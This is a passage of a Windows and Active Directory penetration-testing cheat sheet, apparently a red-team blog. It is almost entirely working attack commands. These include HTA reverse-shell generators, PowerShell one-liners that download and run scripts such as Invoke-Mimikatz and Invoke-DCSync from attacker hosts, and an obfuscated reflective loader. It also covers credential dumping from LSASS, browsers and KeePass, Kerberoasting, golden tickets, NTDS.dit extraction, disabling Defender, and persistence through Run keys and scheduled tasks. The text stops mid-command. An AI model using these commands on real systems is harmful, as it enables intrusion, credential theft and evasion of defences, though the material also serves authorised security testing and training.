python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain, microsoft, github WeirdHTA - Undetectable HTA#https://github.com/felamos/weirdhta python3 --help python3 weirdhta.py 10.10.10.10 4444 --normal (for normal powershell reverse_shell) python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb) python3 weirdhta.py 10.10.10.10 4444 --powercat (for powercat) python3 weirdhta.py 10.10.10.10 4444 --command &#39;c:\\windows\\system32\\cmd.exe&#39; (custom command) EvilWinRM#https://github.com/Hackplayers/evil-winrm Ultimate Shell for WinRM Connections Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] -S, --ssl Enable SSL -c, --pub-key PUBLIC_KEY_PATH Local path to public key certificate -k, --priv-key PRIVATE_KEY_PATH Local path to private key certificate -s, --scripts PS_SCRIPTS_PATH Powershell scripts local path -e, --executables EXES_PATH C# executables local path -i, --ip IP Remote host IP or hostname (required) -U, --url URL Remote url endpoint (default /wsman) -u, --user USER Username (required) -p, --password PASS Password -P, --port PORT Remote host port (default 5985) -V, --version Show version -h, --help Display this help message GetVulnerableGPO#https://github.com/gpoguy/GetVulnerableGPO PowerShell script to find &#39;vulnerable&#39; security-related GPOs that should be hardened (for more background, see the GPO discoverability section of this blog: https://sdmsoftware.com/group-policy-blog/security-related/security-fun-bloodhound-ms16-072-gpo-discoverability/) Requires GPMC &amp; SDM Software GPMC PowerShell Module (used to more easily parse GP settings during the search): https://s3.amazonaws.com/sdmsoftware.com/dl/SDM-GPMC-Module2.0Setup.zip Invoke-PSImage#https://github.com/peewpw/Invoke-PSImage Encodes a PowerShell script in the pixels of a PNG file and generates a oneliner to execute Invoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web. PS&gt;Import-Module .\\Invoke-PSImage.ps1 PS&gt;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\kiwi.jpg [Oneliner to execute from a file] PS&gt;Import-Module .\\Invoke-PSImage.ps1 PS&gt;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\kiwi.jpg -WebRequest [Oneliner to execute from the web] Meterpreter + Donut - Shellcode Injection .NET#https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html A module for executing arbitrary shellcode within Meterpreter aka executing Mimikatz in-memory, reflectively and interactively! donut -f /tmp/mimikatz.exe -a 2 -o /tmp/payload.bin use post/windows/manage/shellcode_inject set SHELLCODE /tmp/payload.bin set SESSION 1 run Privilege EscalationReference: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Run this script: https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat Basicssysteminfo wmic qfe net users hostname whoami net localgroups echo %logonserver% netsh firewall show state netsh firewall show config netstat -an type C:\\Windows\\system32\\drivers\\etc\\hosts PowerUp.ps1 (Sometimes a Quick Win)powershell.exe /c IEX(New-Object Net.WebClient).downloadString(&#39;webserver/PowerUp.ps1&#39;) ;Invoke-AllChecks SharpUp#https://github.com/GhostPack/SharpUp C Sharp Implementation of PowerUp.ps1 which can be reflectively loaded. If It’s AD Get Bloodhound Imported…SharpHound.ps1 SharpHound.exe -&gt; https://github.com/BloodHoundAD/SharpHound IEX(System.Net.WebClient.DownloadString(&#39;http://webserver:4444/SharpHound.ps1&#39;)) Invoke-CollectionMethod All Import .zip to Bloodhound If you can&#39;t exfil the .zip... Find a way ;) I joke, I joke. Output as plain json and copy over manually. It&#39;s a big big pain but it works. Bloodhound-Pythongit clone https://github.com/fox-it/BloodHound.py.git cd BloodHound.py/ &amp;&amp; pip install . bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER.m0chanAD.local -c all Cleartext Passwords# Windows autologin reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot; # VNC reg query &quot;HKCU\\Software\\ORL\\WinVNC3\\Password&quot; # SNMP Parameters reg query &quot;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP&quot; # Putty reg query &quot;HKCU\\Software\\SimonTatham\\PuTTY\\Sessions&quot; # Search for password in registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s View Installed Softwaretasklist /SVC net start reg query HKEY_LOCAL_MACHINE\\SOFTWARE DRIVERQUERY dir /a &quot;C:\\Program Files&quot; dir /a &quot;C:\\Program Files (x86)&quot; reg query HKEY_LOCAL_MACHINE\\SOFTWARE Get-ChildItem &#39;C:\\Program Files&#39;, &#39;C:\\Program Files (x86)&#39; | ft Parent,Name,LastWriteTime Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name Weak Folder PermissionsFull Permissions for &#39;Everyone&#39; on Program Folders icacls &quot;C:\\Program Files\\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot; icacls &quot;C:\\Program Files (x86)\\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot; icacls &quot;C:\\Program Files\\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\\Users&quot; icacls &quot;C:\\Program Files (x86)\\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\\Users&quot; Modify Permissions for Everyone on Program Folders icacls &quot;C:\\Program Files\\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot; icacls &quot;C:\\Program Files (x86)\\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot; icacls &quot;C:\\Program Files\\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\\Users&quot; icacls &quot;C:\\Program Files (x86)\\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\\Users&quot; Scheduled Tasksschtasks /query /fo LIST /v Powershell Historytype C:\\Users\\m0chan\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt cat (Get-PSReadlineOption).HistorySavePath cat (Get-PSReadlineOption).HistorySavePath | sls passw View Connected Drivesnet use wmic logicaldisk get caption,description Get-PSDrive | where {$_.Provider -like &quot;Microsoft.PowerShell.Core\\FileSystem&quot;}| ft Name,Root View Privswhoami /priv Look for SeImpersonate, SeDebugPrivilege etc Is Anyone Else Logged In?qwinsta View Registry Auto-Loginreg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot; Get-ItemProperty -Path &#39;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon&#39; | select &quot;Default*&quot; View Stored Creds in Credential Managercmdkey /list dir C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\ dir C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\ Get-ChildItem -Hidden C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\ Get-ChildItem -Hidden C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\ View Unquoted Service Pathswmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\\Windows\\\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot; gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq &quot;Auto&quot; -and $_.PathName -notlike &quot;C:\\Windows*&quot; -and $_.PathName -notlike &#39;&quot;*&#39;} | select PathName,DisplayName,Name View Startup Itemswmic startup get caption,command reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce dir &quot;C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup&quot; dir &quot;C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\Startup&quot; Check for AlwaysInstalledElevated Reg Keyreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated Get-ItemProperty HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer Get-ItemProperty HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer Any Passwords in Registry?reg query HKCU /f password /t REG_SZ /s reg query HKLM /f password /t REG_SZ /s Any Sysrep or Unattend Files Left Overdir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul Get-Childitem –Path C:\\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like &quot;*.xml&quot; -or $_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.ini&quot;)} GPP (Group Policy Preferences) Passwordssmbclient //DOMAINCONTROLLER.local/SYSVOL -U m0chan \\m0chanAD.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\USER\\Preferences\\Groups\\ http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip - For Decryption Can also use PowerUP.ps1 Dump Chrome Passwords (Also Post Exploit)#git clone https://github.com/rasta-mouse/CookieMonster CookieMonster creds CookieMonster.exe cookies -d [domain] -e CookieMonster -a Must be run in the context of the target users as chrome passwords are encrypted with DPAPI. Can also use Mimikatz for this. mimikatz dpapi::chrome /in:&quot;C:\\Users\\m0chan\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Login Data&quot; mimikatz dpapi::chrome /in:&quot;C:\\Users\\m0chan\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Login Data&quot; /unprotect mimikatz dpapi::chrome /in:&quot;C:\\Users\\m0chan\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Cookies&quot; /unprotect Dump KeePass#https://github.com/HarmJ0y/KeeThief #http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/ Get-Process keepass tasklist | findstr keepass Attacking KeePass #https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1 Import-Module KeeThief.ps1 Get-KeePassDatabaseKey -Verbose KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used. Token Impersonationhttps://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1 Invoke-TokenManipulation -ImpersonateUser -Username &quot;lab\\domainadminuser&quot; Get-Process wininit | Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; Can also use incognito from meterpreter to steal access/delegation tokens and impersonate users. (Requires Admin/SYSTEM Privs) #Tokenvator https://github.com/0xbadjuju/Tokenvator Reflectively Load it with Powershell, Cobalt, SilentTrinity etc... $wc=New-Object System.Net.WebClient;$wc.Headers.Add(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials $k=&quot;xxxxxxx&quot;;$i=0;[byte[]]$b=([byte[]]($wc.DownloadData(&quot;https://xxxxx&quot;)))|%{$_-bxor$k[$i++%$k.length]} [System.Reflection.Assembly]::Load($b) | Out-Null $parameters=@(&quot;arg1&quot;, &quot;arg2&quot;) [namespace.Class]::Main($parameters) Reflectively Load .NET Assembly within Powershell if you cant do it through your C2 Infra Juicy Potato#Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc) #Reference https://ohpe.it/juicy-potato/ Requirements: SeAssignPrimaryTokenPrivilege and/or SeImpersonatePrivilege (new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.5:8000/JuicyPotato.exe&#39;,&#39;C:\\Program Files\\Microsoft SQL Server\\MSSQL12.SQLEXPRESS\\MSSQL\\Backup\\JuicyPotato.exe&#39;) JuicyPotato.exe -l 1337 -p C:\\Users\\Public\\Documents\\Mochan.exe -t * -c {5B3E6773-3A99-4A3D-8096-7765DD11785C} Mochan.exe = Payload 5B3E6773-3A99-4A3D-8096-7765DD11785C = Target CLISD A CLSID is a GUID that identifies a COM class object Can also use -A flag to specify arguments alongside cmd.exe/powershell.exe etc JUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL Kerberoasting#Check my Blog Post Kerberos Attacks in Depth for Further Information #https://m0chan.github.io/Kerberos-Attacks-In-Depth Get-DomainSPNTicket -Credential $cred -OutputFormat hashcat because Hashcat over John anyday right? Invoke-Kerberoast.ps1 python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local/serviceaccount Ofc the above requires access to Port 88 on the DC but you can always port forward if executing GetUserSPNs.py manually. https://github.com/GhostPack/SharpRoast --NOW Deprecated-- and incorproated into Rebeus with the kerberoast action Kerberoast with Python#https://github.com/skelsec/kerberoast IMPORTANT: the accepted formats are the following &lt;ldap_connection_string&gt; : &lt;domainname&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt; &lt;kerberos_connection_string&gt;: &lt;kerberos realm&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt; Look for vulnerable users via LDAP kerberoast ldap all &lt;ldap_connection_string&gt; -o ldapenum Use ASREP roast against users in the ldapenum_asrep_users.txt file kerberoast asreproast &lt;DC_ip&gt; -t ldapenum_asrep_users.txt Use SPN roast against users in the ldapenum_spn_users.txt file kerberoast spnroast &lt;kerberos_connection_string&gt; -t ldapenum_spn_users.txt AS Rep Roasting#Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerable Get-ASRepHash -Domain m0chanAD.local -User victim Can also use Rebeus (Reflectively Load .NET Assembly.) .\\Rubeus.exe asreproast DCSync (Also Post Exploit)#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not allowed to pull password data for users by default. #and anyone with the Replicating Changes permissions set to Allow (i.e., Replicating Changes All/Replicating Directory Changes) mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator powershell.exe -Version 2 -Exec Bypass /c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.6:8000/Invoke-DCSync.ps1&#39;); Invoke-DCSync -PWDumpFormat&quot; Empire Module: powershell/credentials/mimikatz/dcsync_hashdump Post ExploitationUseful Commandsnet user m0chan /add /domain net localgroup Administrators m0chan /add # Enable RDP reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f Turn firewall off netsh firewall set opmode disable Or like this reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f If you get this error: CredSSP Error Fix -&gt; Add this reg key: reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f Disable Windows Defender Set-MpPreference -DisableRealtimeMonitoring $true Esenutl.exe Dump Locked FileC:\\WINDOWS\\system32\\esentutl.exe /y &lt;SOURCE&gt; /vss /d &lt;DEST&gt; Can be useful where you want to dump SAM and (or) SYSTEM but the file is locked by the OS (Windows 10) Check if Powershell Logging is Enabledreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription Run Seatbelt (ABSOLUTELY MUST)#https://github.com/GhostPack/Seatbelt This is stupidily good, it can literally Enum everything you require and is also a .NET Assembly so can be reflectively loaded to avoid AV :D Win Win BasicOSInfo - Basic OS info (i.e. architecture, OS version, etc.) RebootSchedule - Reboot schedule (last 15 days) based on event IDs 12 and 13 TokenGroupPrivs - Current process/token privileges (e.g. SeDebugPrivilege/etc.) UACSystemPolicies - UAC system policies via the registry PowerShellSettings - PowerShell versions and security settings AuditSettings - Audit settings via the registry WEFSettings - Windows Event Forwarding (WEF) settings via the registry LSASettings - LSA settings (including auth packages) UserEnvVariables - Current user environment variables SystemEnvVariables - Current system environment variables UserFolders - Folders in C:\\Users\\ NonstandardServices - Services with file info company names that don&#39;t contain &#39;Microsoft&#39; InternetSettings - Internet settings including proxy configs LapsSettings - LAPS settings, if installed LocalGroupMembers - Members of local admins, RDP, and DCOM MappedDrives - Mapped drives RDPSessions - Current incoming RDP sessions WMIMappedDrives - Mapped drives via WMI NetworkShares - Network shares FirewallRules - Deny firewall rules, &quot;full&quot; dumps all AntiVirusWMI - Registered antivirus (via WMI) InterestingProcesses - &quot;Interesting&quot; processes- defensive products and admin tools RegistryAutoRuns - Registry autoruns RegistryAutoLogon - Registry autologon information DNSCache - DNS cache entries (via WMI) ARPTable - Lists the current ARP table and adapter information (equivalent to arp -a) AllTcpConnections - Lists current TCP connections and associated processes AllUdpConnections - Lists current UDP connections and associated processes NonstandardProcesses - Running processeswith file info company names that don&#39;t contain &#39;Microsoft&#39; * If the user is in high integrity, the following additional actions are run: SysmonConfig - Sysmon configuration from the registry And more!! Dump Creds(new-object System.Net.WebClient).DownloadString(&#39;http://10.10.14.5:8000/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz Can also run Mimikatz.exe after some AV Evasion removing strings etc. ippSec has a great tutorial on this. mimikatz.exe privlege::debug sekurlsa::logonPasswords full The safer method is to dump the process memory of LSASS.exe with MiniDump (https://github.com/3xpl01tc0d3r/Minidump) (or) https://github.com/GhostPack/SharpDump and send the .bin to Mimikatz locally. sekurlsa::minidump C:\\users\\m0chan\\lssas.dmp Can also be used for dumping and pass the ticket attacks but will cover this elsewhere. Mimikatz Guide #Logon Sessions sekurlsa::logonPasswords all #Dump Cache lsadump::cache #Dump SAM lsadump::sam Dump Creds #2#https://github.com/AlessandroZ/LaZagne laZagne.exe all laZagne.exe browsers laZagne.exe browsers -firefox SessionGopher#https://github.com/Arvanaghi/SessionGopher Quietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminals Invoke-SessionGopher -Thorough Import-Module path\\to\\SessionGopher.ps1; Invoke-SessionGopher -AllDomain -u domain.com\\adm-arvanaghi -p s3cr3tP@ss Dump Chrome Passwords (Also Post Exploit)#git clone https://github.com/rasta-mouse/CookieMonster CookieMonster creds CookieMonster.exe cookies -d [domain] -e CookieMonster -a Must be run in the context of the target users as chrome passwords are encrypted with DPAPI. Can also use Mimikatz for this. mimikatz dpapi::chrome /in:&quot;C:\\Users\\m0chan\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Login Data&quot; mimikatz dpapi::chrome /in:&quot;C:\\Users\\m0chan\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Login Data&quot; /unprotect mimikatz dpapi::chrome /in:&quot;C:\\Users\\m0chan\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Cookies&quot; /unprotect Dump Process Memory w/ Mimikittenz#https://github.com/putterpanda/mimikittenz mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes. The aim of mimikittenz is to provide user-level (non-admin privileged) sensitive data extraction in order to maximise post exploitation efforts and increase value of information gathered per target. Invoke-Mimikittenz Dump KeePass#https://github.com/HarmJ0y/KeeThief #http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/ Get-Process keepass tasklist | findstr keepass Attacking KeePass #https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1 Import-Module KeeThief.ps1 Get-KeePassDatabaseKey -Verbose KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used. pypykatz#https://github.com/skelsec/pypykatz Full python implementation of Mimikatz :D pip3 install pypykatz SafetyKatz#https://github.com/GhostPack/SafetyKatz Full C Sharp Implemenatation of Mimikatz that can be reflectively loaded :D &quot;SafetyKatz is a combination of slightly modified version of @gentilkiwis Mimikatz project and @subtee&#39;s .NET PE Loader. First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\\Windows\\Temp\\debug.bin. Then @subtees PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete.&quot; SharpDPAPI#https://github.com/GhostPack/SharpDPAPI Full C Sharp Implementation of Mimikatzs DPAPI features which allows access to DPAPI features. SharpSniper#https://github.com/HunnicCyber/SharpSniper Often a Red Team engagement is more than just achieving Domain Admin. Some clients will want to see if specific users in the domain can be compromised, for example the CEO. SharpSniper is a simple tool to find the IP address of these users so that you can target their box. C:\\&gt; SharpSniper.exe emusk DomainAdminUser DAPass123 User: emusk - IP Address: 192.168.37.130 SharpLocker#https://github.com/Pickfordmatt/SharpLocker SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike. Check for Missing KB’swatson.exe Sherlock.ps1 Use Watson.exe Assembly and reflectively load .NET Assembly into memory to avoid antivirus. More at the bottom re. Reflectively Loading stuff. (Also does not hurt to change certain strings etc) https://github.com/rasta-mouse/Watson Decrypt EFS Files with Mimikatz if Admin/System#https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files cipher /c &quot;d:\\Users\\Gentil Kiwi\\Documents\\m0chan.txt&quot; - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz. privilege::debug token::elevate crypto::system /file:&quot;D:\\Users\\Gentil Kiwi\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates\\B53C6DE283C00203587A03DD3D0BF66E16969A55&quot; /export dpapi::capi /in:&quot;D:\\Users\\Gentil Kiwi\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-21-494464150-3436831043-1864828003-1001\\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot; dpapi::masterkey /in:&quot;D:\\Users\\Gentil Kiwi\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-494464150-3436831043-1864828003-1001\\1eccdbd2-4771-4360-8b19-9d6060a061dc&quot; /password:waza1234/ dpapi::capi /in:&quot;D:\\Users\\Gentil Kiwi\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-21-494464150-3436831043-1864828003-1001\\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot; /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b openssl x509 -inform DER -outform PEM -in B53C6DE283C00203587A03DD3D0BF66E16969A55.der -out public.pem openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_ffb75517-bc6c-4a40-8f8b-e2c555e30e34.pvk -out private.pem openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot UAC Bypasshttps://egre55.github.io/system-properties-uac-bypass/ - Read Ghoul writeup on HTB for more Info findstr /C:&quot;&lt;autoElevate&gt;true&quot; C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe C:\\Windows\\SysWOW64\\SystemPropertiesComputerName.exe C:\\Windows\\SysWOW64\\SystemPropertiesHardware.exe C:\\Windows\\SysWOW64\\SystemPropertiesProtection.exe C:\\Windows\\SysWOW64\\SystemPropertiesRemote.exe Golden Ticket Attack#Check my Blog Post Kerberos Attacks in Depth for Further Information #https://m0chan.github.io/Kerberos-Attacks-In-Depth # To generate the TGT with NTLM mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt; # To generate the TGT with AES 128 key mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt; # To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft) mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt; # Inject TGT with Mimikatz mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt; #Inject Ticket with Rebeus .\\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt; .\\PsExec.exe -accepteula \\\\&lt;remote_hostname&gt; cmd Child Domain to Forest CompromiseDomain = Logical group of objects (users, computers, servers etc etc) supported from a central location like a DC Tree = Set of domains using same name space (DNS Name) Trust = Agreement between 2 domains that allow cross-domain access to resources etc. i/e Michelle@dev.m0chan.com may be able to access resources inside HR.m0chan.com. Forest = Largest Structure composed of all trees. Most trees are linked with dual sided trust relationships to allow for sharing of resources. By default the first domain created if the Forest Root. Lets say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create Covert-NameToSid target.domain.com\\krbtgt S-1-5-21-2941561648-383941485-1389968811-502 Replace 502 with 519 to represent Enterprise Admins Create golden ticket and attack parent domain. This will not work if there is SID Filtering in place for respective target domain. harmj0ys article explains it best. #http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/ Dump NTDS.ditC:\\vssadmin create shadow /for=C: copy \\\\? \\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\ntds\\ntds.dit . copy \\\\? \\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\config\\SYSTEM . copy \\\\? \\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\config\\SAM . reg SAVE HKLM\\SYSTEM c:\\SYS vssadmin delete shadows /for= [/oldest | /all | /shadow=] If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit SeBackupPrivlege - Dump NTDS.ditImport-Module .\\SeBackupPrivilegeCmdLets.dll Import-Module .\\SeBackupPrivilegeUtils.dll PS C:\\m0chan&gt; Get-SeBackupPrivilege SeBackupPrivilege is disabled PS C:\\m0chan&gt; Set-SeBackupPrivilege PS C:\\m0chan&gt; Get-SeBackupPrivilege SeBackupPrivilege is enabled PS C:\\m0chan&gt; Copy-FileSeBackupPrivilege P:\\Windows\\System32\\ntds.dit C:\\m0chan\\ntds.dit -Overwrite Copied 12582912 bytes Use diskshadow to mount a shadow copy and then copy Windows\\system32\\ntds.dit Remember and not use C:\\Windows\\ntds\\ntds.dit reg.exe save hklm\\system c:\\m0chan\\SYSTEM.bak PersistanceSSH Shuttle./run -r root@10.10.110.123 172.16.1.0/24 -e &quot;ssh -i Root.key&quot; SharPersist#https://github.com/fireeye/SharPersist C# Libary Designed by FireEye to aid with Persistance using various techniques such as KeePass Backdoor Reg Key Sch Task Backdoor Startup Folder (Link File) Service Backdoor See there github linked above for full Syntax, very cool work SharpDoor#https://github.com/infosecn1nja/SharpDoor.git SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently only support for Windows 10. execute-assembly /root/Toolkits/SharpBinaries/SharpDoor.exe AutoRun Registry[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce] [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices] [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce] [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon] [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce] [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices] [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce] [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon] Run &amp; Run Oncereg add &quot;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot; /v WindowsUpdate /t REG_SZ /d &quot;C:\\Temp\\SoftwareUpdate\\Malware.exe&quot; Scheduled Tasks#Note - Beaware. some EDR/Endpoint Solutions detect Scheduled Tasks being created and trigger alerts. schtasks /create /sc minute /mo 1 /tn &quot;Malware&quot; /tr C:\\Temp\\SoftwareUpdate\\Malware.exe This will run Malware.exe every minute forever. # Run Malware.exe every day at 06:00am schtasks /create /tn &quot;SoftwareUpdate&quot; /tr 